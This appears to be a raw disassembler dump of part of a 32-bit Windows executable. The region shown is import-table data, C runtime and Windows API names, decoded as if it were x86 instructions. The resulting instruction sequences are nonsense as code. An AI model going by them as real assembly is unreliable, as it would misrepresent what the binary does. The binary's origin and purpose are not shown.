  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
